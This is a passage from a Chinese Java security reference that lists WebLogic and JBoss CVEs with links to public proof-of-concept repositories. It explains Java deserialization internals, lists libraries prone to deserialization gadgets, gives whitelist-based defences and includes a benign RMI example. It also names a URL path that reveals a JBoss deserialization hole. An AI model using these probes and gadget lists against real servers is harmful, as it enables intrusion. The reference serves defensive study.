<p>WebLogic是美国Oracle公司出品的一个Application Server，是一个基于Java EE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。其将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。</p>
<p>WebLogic对业内多种标准的全面支持，包括EJB、JSP、Servlet、JMS、JDBC等。</p>
</div>
<div class="section" id="id3">
<h6>相关CVE<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h6>
<ul class="simple">
<li><dl class="first docutils">
<dt>CVE-2019-2725</dt>
<dd><ul class="first last">
<li>wls-wsat 反序列化远程代码执行</li>
</ul>
</dd>
</dl>
</li>
<li>CVE-2019-2658</li>
<li>CVE-2019-2650</li>
<li>CVE-2019-2649</li>
<li>CVE-2019-2648</li>
<li>CVE-2019-2647</li>
<li>CVE-2019-2646</li>
<li>CVE-2019-2645</li>
<li><dl class="first docutils">
<dt>CVE-2019-2618</dt>
<dd><ul class="first last">
<li><a class="reference external" href="https://github.com/jas502n/cve-2019-2618/">https://github.com/jas502n/cve-2019-2618/</a></li>
</ul>
</dd>
</dl>
</li>
<li>CVE-2019-2615</li>
<li>CVE-2019-2568</li>
<li>CVE-2018-3252</li>
<li>CVE-2018-3248</li>
<li>CVE-2018-3245</li>
<li>CVE-2018-3201</li>
<li>CVE-2018-3197</li>
<li><dl class="first docutils">
<dt>CVE-2018-3191</dt>
<dd><ul class="first last">
<li><a class="reference external" href="https://github.com/voidfyoo/CVE-2018-3191">https://github.com/voidfyoo/CVE-2018-3191</a></li>
<li><a class="reference external" href="https://github.com/Libraggbond/CVE-2018-3191">https://github.com/Libraggbond/CVE-2018-3191</a></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>CVE-2018-2894</dt>
<dd><ul class="first last">
<li>任意文件上传</li>
<li><a class="reference external" href="https://xz.aliyun.com/t/2458">https://xz.aliyun.com/t/2458</a></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>CVE-2018-2893</dt>
<dd><ul class="first last">
<li>反序列化</li>
<li><a class="reference external" href="https://www.freebuf.com/vuls/178105.html">https://www.freebuf.com/vuls/178105.html</a></li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>CVE-2018-2628</dt>
<dd><ul class="first last">
<li><a class="reference external" href="https://mp.weixin.qq.com/s/nYY4zg2m2xsqT0GXa9pMGA">https://mp.weixin.qq.com/s/nYY4zg2m2xsqT0GXa9pMGA</a></li>
</ul>
</dd>
</dl>
</li>
<li>CVE-2018-1258</li>
<li><dl class="first docutils">
<dt>CVE-2017-10271</dt>
<dd><ul class="first last">
<li>XMLDecoder 反序列化漏洞</li>
<li><a class="reference external" href="http://webcache.googleusercontent.com/search?q=cache%3AsH7j8TF8uOIJ%3Awww.freebuf.com%2Fvuls%2F160367.html">http://webcache.googleusercontent.com/search?q=cache%3AsH7j8TF8uOIJ%3Awww.freebuf.com%2Fvuls%2F160367.html</a></li>
</ul>
</dd>
</dl>
</li>
<li>CVE-2017-3248</li>
<li>CVE-2016-3510</li>
<li><dl class="first docutils">
<dt>CVE-2015-4852</dt>
<dd><ul class="first last">
<li><a class="reference external" href="https://github.com/roo7break/serialator">https://github.com/roo7break/serialator</a></li>
</ul>
</dd>
</dl>
</li>
</ul>
</div>
</div>
<div class="section" id="jboss">
<h5>JBoss<a class="headerlink" href="#jboss" title="永久链接至标题">¶</a></h5>
<div class="section" id="id4">
<h6>简介<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h6>
<p>JBoss是一个基于J2EE的管理EJB的容器和服务器，但JBoss核心服务不包括支持servlet/JSP的WEB容器，一般与Tomcat或Jetty绑定使用。</p>
</div>
<div class="section" id="id5">
<h6>相关CVE<a class="headerlink" href="#id5" title="永久链接至标题">¶</a></h6>
<ul class="simple">
<li><dl class="first docutils">
<dt>CVE-2017-12149</dt>
<dd><ul class="first last">
<li>反序列化漏洞</li>
<li>访问 <code class="docutils literal notranslate"><span class="pre">/invoker/readonly</span></code> ，页面存在即有反序列化漏洞</li>
</ul>
</dd>
</dl>
</li>
</ul>
</div>
</div>
<div class="section" id="jetty">
<h5>Jetty<a class="headerlink" href="#jetty" title="永久链接至标题">¶</a></h5>
<div class="section" id="id6">
<h6>简介<a class="headerlink" href="#id6" title="永久链接至标题">¶</a></h6>
<p>Jetty是一个开源的servlet容器。</p>
</div>
</div>
</div>
<span id="document-language/java/sandbox"></span><div class="section" id="id1">
<h4>沙箱<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h4>
<div class="section" id="id2">
<h5>简介<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h5>
<p>Java实现了一套沙箱环境，使远程的非可信代码只能在受限的环境下执行。</p>
</div>
<div class="section" id="cve">
<h5>相关CVE<a class="headerlink" href="#cve" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>CVE-2012-0507</li>
<li>CVE-2012-4681</li>
<li>CVE-2017-3272</li>
<li>CVE-2017-3289</li>
</ul>
</div>
</div>
<span id="document-language/java/unserialize"></span><div class="section" id="id1">
<h4>反序列化<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h4>
<div class="section" id="id2">
<h5>简介<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h5>
<p>序列化就是把对象转换成字节流，便于保存在内存、文件、数据库中；反序列化即逆过程，由字节流还原成对象。一般用于远程调用、通过网络将对象传输至远程服务器、存储对象到数据库或本地等待重用等场景中。Java中的 <code class="docutils literal notranslate"><span class="pre">ObjectOutputStream</span></code> 类的 <code class="docutils literal notranslate"><span class="pre">writeObject()</span></code> 方法可以实现序列化，类 <code class="docutils literal notranslate"><span class="pre">ObjectInputStream</span></code> 类的 <code class="docutils literal notranslate"><span class="pre">readObject()</span></code> 方法用于反序列化。如果要实现类的反序列化，则是对其实现 <code class="docutils literal notranslate"><span class="pre">Serializable</span></code> 接口。</p>
<p>当远程服务接受不可信的数据并进行反序列化且当前环境中存在可利用的类时，就认为存在反序列化漏洞。</p>
<div class="section" id="id3">
<h6>序列数据结构<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h6>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">0xaced</span></code> 魔术头 / STREAM_MAGIC</li>
<li><code class="docutils literal notranslate"><span class="pre">0x0005</span></code> 版本号 / STREAM_VERSION / 参考 java.io.ObjectStreamConstants</li>
</ul>
</div>
<div class="section" id="id4">
<h6>序列化流程<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h6>
<ul class="simple">
<li>ObjectOutputStream实例初始化时，将魔术头和版本号写入bout (BlockDataOutputStream类型) 中</li>
<li><dl class="first docutils">
<dt>调用ObjectOutputStream.writeObject()开始写对象数据</dt>
<dd><ul class="first last">
<li>ObjectStreamClass.lookup()封装待序列化的类描述 (返回ObjectStreamClass类型) ，获取包括类名、自定义serialVersionUID、可序列化字段 (返回ObjectStreamField类型) 和构造方法，以及writeObject、readObject方法等</li>
<li><dl class="first docutils">
<dt>writeOrdinaryObject()写入对象数据</dt>
<dd><ul class="first last">
<li>写入对象类型标识</li>
<li><dl class="first docutils">
<dt>writeClassDesc()进入分支writeNonProxyDesc()写入类描述数据</dt>
<dd><ul class="first last">
<li>写入类描述符标识</li>
<li>写入类名</li>
<li>写入SUID (当SUID为空时，会进行计算并赋值)</li>
<li>计算并写入序列化属性标志位</li>
<li>写入字段信息数据</li>
<li>写入Block Data结束标识</li>
<li>写入父类描述数据</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>writeSerialData()写入对象的序列化数据</dt>
<dd><ul class="first last">
<li>若类自定义了writeObject()，则调用该方法写对象，否则调用defaultWriteFields()写入对象的字段数据 (若是非原始类型，则递归处理子对象)</li>
</ul>
</dd>
</dl>
</li>
</ul>
</dd>
</dl>
</li>
</ul>
</dd>
</dl>
</li>
</ul>
</div>
<div class="section" id="id5">
<h6>反序列化流程<a class="headerlink" href="#id5" title="永久链接至标题">¶</a></h6>
<ul class="simple">
<li>ObjectInputStream实例初始化时，读取魔术头和版本号进行校验</li>
<li><dl class="first docutils">
<dt>调用ObjectInputStream.readObject()开始读对象数据</dt>
<dd><ul class="first last">
<li>读取对象类型标识</li>
<li><dl class="first docutils">
<dt>readOrdinaryObject()读取数据对象</dt>
<dd><ul class="first last">
<li><dl class="first docutils">
<dt>readClassDesc()读取类描述数据</dt>
<dd><ul class="first last">
<li>读取类描述符标识，进入分支readNonProxyDesc()</li>
<li>读取类名</li>
<li>读取SUID</li>
<li>读取并分解序列化属性标志位</li>
<li>读取字段信息数据</li>
<li>resolveClass()根据类名获取待反序列化的类的Class对象，如果获取失败，则抛出ClassNotFoundException</li>
<li>skipCustomData()循环读取字节直到Block Data结束标识为止</li>
<li>读取父类描述数据</li>
<li>initNonProxy()中判断对象与本地对象的SUID和类名 (不含包名) 是否相同，若不同，则抛出InvalidClassException</li>
</ul>
</dd>
</dl>
</li>
<li>ObjectStreamClass.newInstance()获取并调用离对象最近的非Serializable的父类的无参构造方法 (若不存在，则返回null) 创建对象实例</li>
<li><dl class="first docutils">
<dt>readSerialData()读取对象的序列化数据</dt>
<dd><ul class="first last">
<li>若类自定义了readObject()，则调用该方法读对象，否则调用defaultReadFields()读取并填充对象的字段数据</li>
</ul>
</dd>
</dl>
</li>
</ul>
</dd>
</dl>
</li>
</ul>
</dd>
</dl>
</li>
</ul>
</div>
</div>
<div class="section" id="id6">
<h5>漏洞利用<a class="headerlink" href="#id6" title="永久链接至标题">¶</a></h5>
<div class="section" id="id7">
<h6>存在危险的基础库<a class="headerlink" href="#id7" title="永久链接至标题">¶</a></h6>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">com.mchange:c3p0</span> <span class="pre">0.9.5.2</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">com.mchange:mchange-commons-java</span> <span class="pre">0.2.11</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">commons-beanutils</span> <span class="pre">1.9.2</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">commons-collections</span> <span class="pre">3.1</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">commons-fileupload</span> <span class="pre">1.3.1</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">commons-io</span> <span class="pre">2.4</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">commons-logging</span> <span class="pre">1.2</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">org.apache.commons:commons-collections</span> <span class="pre">4.0</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">org.beanshell:bsh</span> <span class="pre">2.0b5</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">org.codehaus.groovy:groovy</span> <span class="pre">2.3.9</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">org.slf4j:slf4j-api</span> <span class="pre">1.7.21</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">org.springframework:spring-aop</span> <span class="pre">4.1.4.RELEASE</span></code></li>
</ul>
</div>
</div>
<div class="section" id="id8">
<h5>漏洞修复和防护<a class="headerlink" href="#id8" title="永久链接至标题">¶</a></h5>
<div class="section" id="hook-resolveclass">
<h6>Hook resolveClass<a class="headerlink" href="#hook-resolveclass" title="永久链接至标题">¶</a></h6>
<p>在使用 <code class="docutils literal notranslate"><span class="pre">readObject()</span></code> 反序列化时会调用 <code class="docutils literal notranslate"><span class="pre">resolveClass</span></code> 方法读取反序列化的类名，可以通过hook该方法来校验反序列化的类，一个Demo如下</p>
<div class="code java highlight-default notranslate"><div class="highlight"><pre><span></span>@Override
protected Class&lt;?&gt; resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
    if (!desc.getName().equals(SerialObject.class.getName())) {
        throw new InvalidClassException(
                &quot;Unauthorized deserialization attempt&quot;,
                desc.getName());
    }
    return super.resolveClass(desc);
}
</pre></div>
</div>
<p>以上的Demo就只允许序列化 <code class="docutils literal notranslate"><span class="pre">SerialObject</span></code> ，通过这种方式，就可以设置允许序列化的白名单，来防止反序列化漏洞被利用。SerialKiller/Jackson/Weblogic等都使用了这种方式来防御。</p>
</div>
<div class="section" id="validatingobjectinputstream">
<h6>ValidatingObjectInputStream<a class="headerlink" href="#validatingobjectinputstream" title="永久链接至标题">¶</a></h6>
<p>Apache Commons IO Serialization包中的 <code class="docutils literal notranslate"><span class="pre">ValidatingObjectInputStream</span></code> 类提供了 <code class="docutils literal notranslate"><span class="pre">accept</span></code> 方法，可以通过该方法来实现反序列化类白/黑名单控制，一个demo如下</p>
<div class="code java highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">private</span> <span class="n">static</span> <span class="n">Object</span> <span class="n">deserialize</span><span class="p">(</span><span class="n">byte</span><span class="p">[]</span> <span class="n">buffer</span><span class="p">)</span> <span class="n">throws</span> <span class="n">IOException</span><span class="p">,</span> <span class="n">ClassNotFoundException</span> <span class="p">,</span> <span class="n">ConfigurationException</span> <span class="p">{</span>
    <span class="n">Object</span> <span class="n">obj</span><span class="p">;</span>
    <span class="n">ByteArrayInputStream</span> <span class="n">bais</span> <span class="o">=</span> <span class="n">new</span> <span class="n">ByteArrayInputStream</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
    <span class="n">ValidatingObjectInputStream</span> <span class="n">ois</span> <span class="o">=</span> <span class="n">new</span> <span class="n">ValidatingObjectInputStream</span><span class="p">(</span><span class="n">bais</span><span class="p">);</span>
    <span class="n">ois</span><span class="o">.</span><span class="n">accept</span><span class="p">(</span><span class="n">SerialObject</span><span class="o">.</span><span class="n">class</span><span class="p">);</span>
    <span class="n">obj</span> <span class="o">=</span> <span class="n">ois</span><span class="o">.</span><span class="n">readObject</span><span class="p">();</span>
    <span class="k">return</span> <span class="n">obj</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</div>
</div>
<div class="section" id="objectinputfilter-jep290">
<h6>ObjectInputFilter(JEP290)<a class="headerlink" href="#objectinputfilter-jep290" title="永久链接至标题">¶</a></h6>
<p>Java 9提供了支持序列化数据过滤的新特性，可以继承 <code class="docutils literal notranslate"><span class="pre">java.io.ObjectInputFilter</span></code> 类重写 <code class="docutils literal notranslate"><span class="pre">checkInput</span></code> 方法来实现自定义的过滤器，并使用 <code class="docutils literal notranslate"><span class="pre">ObjectInputStream</span></code> 对象的 <code class="docutils literal notranslate"><span class="pre">setObjectInputFilter</span></code> 设置过滤器来实现反序列化类白/黑名单控制。这个机制本身是针对Java 9的一个新特性，但是随后官方突然决定向下引进该增强机制，分别对JDK 6,7,8进行了支持。这个机制主要描述了如下的机制：</p>
<ul class="simple">
<li>提供一个限制反序列化类的机制，白名单或者黑名单</li>
<li>限制反序列化的深度和复杂度</li>
<li>为RMI远程调用对象提供了一个验证类的机制</li>
<li>定义一个可配置的过滤机制，比如可以通过配置properties文件的形式来定义过滤器</li>
</ul>
</div>
</div>
</div>
<span id="document-language/java/rmi"></span><div class="section" id="rmi">
<h4>RMI<a class="headerlink" href="#rmi" title="永久链接至标题">¶</a></h4>
<div class="section" id="id1">
<h5>简介<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h5>
<p>RMI(Remote Method Invocation，远程方法调用)能够让在客户端Java虚拟机上的对象像调用本地对象一样调用服务端Java虚拟机中的对象上的方法。其中RMI标准实现是Java RMI，之外还有Weblogic RMI、Spring RMI等不同的实现。</p>
<p>RMI中比较重要的两个概念是Stub和Skeleton，Stub和Skeleton对同一套接口进行实现，其中Stub由Client端调用，并不进行真正的实现，而是和Server端通信。Skeleton是Server端，监听来自Stub的连接，根据Stub发送的数据进行真正的操作。</p>
</div>
<div class="section" id="id2">
<h5>调用步骤<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>客户调用客户端辅助对象Stub上的方法</li>
<li>客户端辅助对象Stub打包调用信息(变量，方法名)，通过网络发送给服务端辅助对象Skeleton</li>
<li>服务端辅助对象Skeleton将客户端辅助对象发送来的信息解包，找出真正被调用的方法以及该方法所在对象</li>
<li>调用真正服务对象上的真正方法，并将结果返回给服务端辅助对象Skeleton</li>
<li>服务端辅助对象将结果打包，发送给客户端辅助对象Stub</li>
<li>客户端辅助对象将返回值解包，返回给调用者</li>
<li>客户获得返回值</li>
</ul>
</div>
<div class="section" id="id3">
<h5>样例<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h5>
<p>一份代码样例如下(来自《Enterprise JavaBeans》)：</p>
<div class="section" id="person">
<h6>Person接口定义<a class="headerlink" href="#person" title="永久链接至标题">¶</a></h6>
<div class="code java highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">public</span> <span class="n">interface</span> <span class="n">Person</span> <span class="p">{</span>
    <span class="n">public</span> <span class="nb">int</span> <span class="n">getAge</span><span class="p">()</span> <span class="n">throws</span> <span class="n">Throwable</span><span class="p">;</span>
    <span class="n">public</span> <span class="n">String</span> <span class="n">getName</span><span class="p">()</span> <span class="n">throws</span> <span class="n">Throwable</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</div>
</div>
<div class="section" id="personserverperson">
<h6>使用PersonServer实现Person<a class="headerlink" href="#personserverperson" title="永久链接至标题">¶</a></h6>
<div class="code java highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">public</span> <span class="k">class</span> <span class="nc">PersonServer</span> <span class="n">implements</span> <span class="n">Person</span> <span class="p">{</span>
    <span class="n">private</span> <span class="nb">int</span> <span class="n">age</span><span class="p">;</span>
    <span class="n">private</span> <span class="n">String</span> <span class="n">name</span><span class="p">;</span>
    <span class="n">public</span> <span class="n">PersonServer</span><span class="p">(</span><span class="n">String</span> <span class="n">name</span><span class="p">,</span> <span class="nb">int</span> <span class="n">age</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">this</span><span class="o">.</span><span class="n">age</span> <span class="o">=</span> <span class="n">age</span><span class="p">;</span>
        <span class="n">this</span><span class="o">.</span><span class="n">name</span> <span class="o">=</span> <span class="n">name</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">public</span> <span class="nb">int</span> <span class="n">getAge</span><span class="p">()</span> <span class="p">{</span>
        <span class="k">return</span> <span class="n">age</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">public</span> <span class="n">String</span> <span class="n">getName</span><span class="p">()</span> <span class="p">{</span>
        <span class="k">return</span> <span class="n">name</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></div>
</div>
</div>
<div class="section" id="person-stubperson">
<h6>使用Person_Stub实现Person<a class="headerlink" href="#person-stubperson" title="永久链接至标题">¶</a></h6>
<div class="code java highlight-default notranslate"><div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">java.io.ObjectOutputStream</span><span class="p">;</span>
<span class="kn">import</span> <span class="nn">java.io.ObjectInputStream</span><span class="p">;</span>
<span class="kn">import</span> <span class="nn">java.net.Socket</span><span class="p">;</span>
<span class="n">public</span> <span class="k">class</span> <span class="nc">Person_Stub</span> <span class="n">implements</span> <span class="n">Person</span> <span class="p">{</span>
    <span class="n">private</span> <span class="n">Socket</span> <span class="n">socket</span><span class="p">;</span>
    <span class="n">public</span> <span class="n">Person_Stub</span><span class="p">()</span> <span class="n">throws</span> <span class="n">Throwable</span> <span class="p">{</span>
        <span class="o">//</span> <span class="n">connect</span> <span class="n">to</span> <span class="n">skeleton</span>
        <span class="n">socket</span> <span class="o">=</span> <span class="n">new</span> <span class="n">Socket</span><span class="p">(</span><span class="s2">&quot;computer_name&quot;</span><span class="p">,</span> <span class="mi">9000</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">public</span> <span class="nb">int</span> <span class="n">getAge</span><span class="p">()</span> <span class="n">throws</span> <span class="n">Throwable</span> <span class="p">{</span>
        <span class="o">//</span> <span class="k">pass</span> <span class="n">method</span> <span class="n">name</span> <span class="n">to</span> <span class="n">skeleton</span>
        <span class="n">ObjectOutputStream</span> <span class="n">outStream</span> <span class="o">=</span>
            <span class="n">new</span> <span class="n">ObjectOutputStream</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">getOutputStream</span><span class="p">());</span>
        <span class="n">outStream</span><span class="o">.</span><span class="n">writeObject</span><span class="p">(</span><span class="s2">&quot;age&quot;</span><span class="p">);</span>
        <span class="n">outStream</span><span class="o">.</span><span class="n">flush</span><span class="p">();</span>
        <span class="n">ObjectInputStream</span> <span class="n">inStream</span> <span class="o">=</span>
            <span class="n">new</span> <span class="n">ObjectInputStream</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">getInputStream</span><span class="p">());</span>
        <span class="k">return</span> <span class="n">inStream</span><span class="o">.</span><span class="n">readInt</span><span class="p">();</span>
    <span class="p">}</span>
    <span class="n">public</span> <span class="n">String</span> <span class="n">getName</span><span class="p">()</span> <span class="n">throws</span> <span class="n">Throwable</span> <span class="p">{</span>
        <span class="o">//</span> <span class="k">pass</span> <span class="n">method</span> <span class="n">name</span> <span class="n">to</span> <span class="n">skeleton</span>
        <span class="n">ObjectOutputStream</span> <span class="n">outStream</span> <span class="o">=</span>
            <span class="n">new</span> <span class="n">ObjectOutputStream</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">getOutputStream</span><span class="p">());</span>
        <span class="n">outStream</span><span class="o">.</span><span class="n">writeObject</span><span class="p">(</span><span class="s2">&quot;name&quot;</span><span class="p">);</span>
        <span class="n">outStream</span><span class="o">.</span><span class="n">flush</span><span class="p">();</span>
        <span class="n">ObjectInputStream</span> <span class="n">inStream</span> <span class="o">=</span>
            <span class="n">new</span> <span class="n">ObjectInputStream</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">getInputStream</span><span class="p">());</span>
        <span class="k">return</span> <span class="p">(</span><span class="n">String</span><span class="p">)</span><span class="n">inStream</span><span class="o">.</span><span class="n">readObject</span><span class="p">();</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></div>
</div>
</div>
<div class="section" id="skeleton">
<h6>Skeleton的实现<a class="headerlink" href="#skeleton" title="永久链接至标题">¶</a></h6>
<div class="code java highlight-default notranslate"><div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">java.io.ObjectOutputStream</span><span class="p">;</span>
<span class="kn">import</span> <span class="nn">java.io.ObjectInputStream</span><span class="p">;</span>
<span class="kn">import</span> <span class="nn">java.net.Socket</span><span class="p">;</span>
<span class="kn">import</span> <span class="nn">java.net.ServerSocket</span><span class="p">;</span>
<span class="n">public</span> <span class="k">class</span> <span class="nc">Person_Skeleton</span> <span class="n">extends</span> <span class="n">Thread</span> <span class="p">{</span>
    <span class="n">private</span> <span class="n">PersonServer</span> <span class="n">myServer</span><span class="p">;</span>
    <span class="n">public</span> <span class="n">Person_Skeleton</span><span class="p">(</span><span class="n">PersonServer</span> <span class="n">server</span><span class="p">)</span> <span class="p">{</span>
        <span class="o">//</span> <span class="n">get</span> <span class="n">reference</span> <span class="n">of</span> <span class="nb">object</span> <span class="n">server</span>
        <span class="n">this</span><span class="o">.</span><span class="n">myServer</span> <span class="o">=</span> <span class="n">server</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">public</span> <span class="n">void</span> <span class="n">run</span><span class="p">()</span> <span class="p">{</span>
        <span class="k">try</span> <span class="p">{</span>
            <span class="o">//</span> <span class="n">new</span> <span class="n">socket</span> <span class="n">at</span> <span class="n">port</span> <span class="mi">9000</span>
            <span class="n">ServerSocket</span> <span class="n">serverSocket</span> <span class="o">=</span> <span class="n">new</span> <span class="n">ServerSocket</span><span class="p">(</span><span class="mi">9000</span><span class="p">);</span>
            <span class="o">//</span> <span class="n">accept</span> <span class="n">stub</span><span class="s1">&#39;s request</span>
            <span class="n">Socket</span> <span class="n">socket</span> <span class="o">=</span> <span class="n">serverSocket</span><span class="o">.</span><span class="n">accept</span><span class="p">();</span>
            <span class="k">while</span> <span class="p">(</span><span class="n">socket</span> <span class="o">!=</span> <span class="n">null</span><span class="p">)</span> <span class="p">{</span>
                <span class="o">//</span> <span class="n">get</span> <span class="n">stub</span><span class="s1">&#39;s request</span>
                <span class="n">ObjectInputStream</span> <span class="n">inStream</span> <span class="o">=</span>
                    <span class="n">new</span> <span class="n">ObjectInputStream</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">getInputStream</span><span class="p">());</span>
                <span class="n">String</span> <span class="n">method</span> <span class="o">=</span> <span class="p">(</span><span class="n">String</span><span class="p">)</span><span class="n">inStream</span><span class="o">.</span><span class="n">readObject</span><span class="p">();</span>
                <span class="o">//</span> <span class="n">check</span> <span class="n">method</span> <span class="n">name</span>
                <span class="k">if</span> <span class="p">(</span><span class="n">method</span><span class="o">.</span><span class="n">equals</span><span class="p">(</span><span class="s2">&quot;age&quot;</span><span class="p">))</span> <span class="p">{</span>
                    <span class="o">//</span> <span class="n">execute</span> <span class="nb">object</span> <span class="n">server</span><span class="s1">&#39;s business method</span>
                    <span class="nb">int</span> <span class="n">age</span> <span class="o">=</span> <span class="n">myServer</span><span class="o">.</span><span class="n">getAge</span><span class="p">();</span>
                    <span class="n">ObjectOutputStream</span> <span class="n">outStream</span> <span class="o">=</span>
                        <span class="n">new</span> <span class="n">ObjectOutputStream</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">getOutputStream</span><span class="p">());</span>
                    <span class="o">//</span> <span class="k">return</span> <span class="n">result</span> <span class="n">to</span> <span class="n">stub</span>
                    <span class="n">outStream</span><span class="o">.</span><span class="n">writeInt</span><span class="p">(</span><span class="n">age</span><span class="p">);</span>
                    <span class="n">outStream</span><span class="o">.</span><span class="n">flush</span><span class="p">();</span>
                <span class="p">}</span>
                <span class="k">if</span><span class="p">(</span><span class="n">method</span><span class="o">.</span><span class="n">equals</span><span class="p">(</span><span class="s2">&quot;name&quot;</span><span class="p">))</span> <span class="p">{</span>
                    <span class="o">//</span> <span class="n">execute</span> <span class="nb">object</span> <span class="n">server</span><span class="s1">&#39;s business method</span>
                    <span class="n">String</span> <span class="n">name</span> <span class="o">=</span> <span class="n">myServer</span><span class="o">.</span><span class="n">getName</span><span class="p">();</span>
                    <span class="n">ObjectOutputStream</span> <span class="n">outStream</span> <span class="o">=</span>
                        <span class="n">new</span> <span class="n">ObjectOutputStream</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">getOutputStream</span><span class="p">());</span>
                    <span class="o">//</span> <span class="k">return</span> <span class="n">result</span> <span class="n">to</span> <span class="n">stub</span>
                    <span class="n">outStream</span><span class="o">.</span><span class="n">writeObject</span><span class="p">(</span><span class="n">name</span><span class="p">);</span>
                    <span class="n">outStream</span><span class="o">.</span><span class="n">flush</span><span class="p">();</span>
                <span class="p">}</span>
            <span class="p">}</span>
        <span class="p">}</span> <span class="n">catch</span><span class="p">(</span><span class="n">Throwable</span> <span class="n">t</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">t</span><span class="o">.</span><span class="n">printStackTrace</span><span class="p">();</span>
            <span class="n">System</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="n">public</span> <span class="n">static</span> <span class="n">void</span> <span class="n">main</span><span class="p">(</span><span class="n">String</span> <span class="n">args</span> <span class="p">[])</span> <span class="p">{</span>
        <span class="o">//</span> <span class="n">new</span> <span class="nb">object</span> <span class="n">server</span>
        <span class="n">PersonServer</span> <span class="n">person</span> <span class="o">=</span> <span class="n">new</span> <span class="n">PersonServer</span><span class="p">(</span><span class="s2">&quot;Richard&quot;</span><span class="p">,</span> <span class="mi">34</span><span class="p">);</span>
        <span class="n">Person_Skeleton</span> <span class="n">skel</span> <span class="o">=</span> <span class="n">new</span> <span class="n">Person_Skeleton</span><span class="p">(</span><span class="n">person</span><span class="p">);</span>
        <span class="n">skel</span><span class="o">.</span><span class="n">start</span><span class="p">();</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></div>
</div>
</div>
<div class="section" id="client">
<h6>Client实现<a class="headerlink" href="#client" title="永久链接至标题">¶</a></h6>
<div class="code java highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">public</span> <span class="k">class</span> <span class="nc">PersonClient</span> <span class="p">{</span>
    <span class="n">public</span> <span class="n">static</span> <span class="n">void</span> <span class="n">main</span><span class="p">(</span><span class="n">String</span> <span class="p">[]</span> <span class="n">args</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">try</span> <span class="p">{</span>
            <span class="n">Person</span> <span class="n">person</span> <span class="o">=</span> <span class="n">new</span> <span class="n">Person_Stub</span><span class="p">();</span>
            <span class="nb">int</span> <span class="n">age</span> <span class="o">=</span> <span class="n">person</span><span class="o">.</span><span class="n">getAge</span><span class="p">();</span>
            <span class="n">String</span> <span class="n">name</span> <span class="o">=</span> <span class="n">person</span><span class="o">.</span><span class="n">getName</span><span class="p">();</span>
            <span class="n">System</span><span class="o">.</span><span class="n">out</span><span class="o">.</span><span class="n">println</span><span class="p">(</span><span class="n">name</span> <span class="o">+</span> <span class="s2">&quot; is &quot;</span> <span class="o">+</span> <span class="n">age</span> <span class="o">+</span> <span class="s2">&quot; years old&quot;</span><span class="p">);</span>
        <span class="p">}</span> <span class="n">catch</span><span class="p">(</span><span class="n">Throwable</span> <span class="n">t</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">t</span><span class="o">.</span><span class="n">printStackTrace</span><span class="p">();</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></div>
</div>
</div>
</div>
<div class="section" id="t3">
<h5>T3协议<a class="headerlink" href="#t3" title="永久链接至标题">¶</a></h5>
